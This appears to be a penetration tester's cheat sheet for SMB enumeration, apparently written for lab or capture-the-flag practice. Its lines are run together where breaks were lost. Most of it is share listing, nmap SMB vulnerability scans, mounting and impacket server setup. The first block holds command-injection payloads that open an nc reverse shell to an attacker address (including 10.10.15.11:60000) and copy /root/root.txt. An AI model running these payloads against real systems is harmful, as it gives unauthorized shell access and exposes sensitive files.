# **SMB Enumeration**

```
smbclient -L x.x.x.xsmbmount //x.x.x.x/share /mnt –o username=hodor,workgroup=hodorsmbclient \\\\x.x.x.x\\shareenum4linux -a iprpcclient -U "" x.x.x.x  #Anonymous bind using rpcclient / Null connectsmbclient //MOUNT/share #Connect to SMB share​smbclient -U "/=\`nohup nc -e /bin/sh LHOST LPORT\`" -N -I ip //LAME/tmp​nmap -T4 -sS -sC -Pn -A --script smb-vuln* ipsmbclient //ip/tmplogon "./=`nohup nc -e /bin/sh LHOST LPORT`"​smbclient -U "/=\`nohup cat /root/root.txt > /tmp/ttt\`" -N -I ip //LAME/tmp​smbclient -U "/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`" -N -I ip //LAME/tmp​smbclient -L ipenum4linux -S ip​​​
```

## **Nmap SMB Script Scan <a href="#nmap-smb-script-scan" id="nmap-smb-script-scan"></a>**

```
#SMB Users and share Scannmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse ip​#SMB Vulnerability Scannmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse ipnmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 ipnmap --script=smb-check-vulns.nse x.x.x.x​
```

```
mount ip:/vol/share /mnt/nfs  -nolockmount -t cifs -o username=user,password=pass,domain=blah //ip.X/share-name /mnt/cifsmount -t cifs //x.x.x.x/share /mntmount -t cifs -o username=hodor,password=hodor //x.x.x.x/share /mntMounting File Shareshowmount -e IPADDR
```

Mounting Share folder

```
sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other​
```

## **Create a SMB Server <a href="#create-a-smb-server" id="create-a-smb-server"></a>**

```
in kali hosting a smb serverimpacket-smbserver ShareFolder `pwd`​In windowsNew-PSDrive -Name "Followme" -PSProvider "FileSystem" -Root "\\ip\ShareFolder"
```
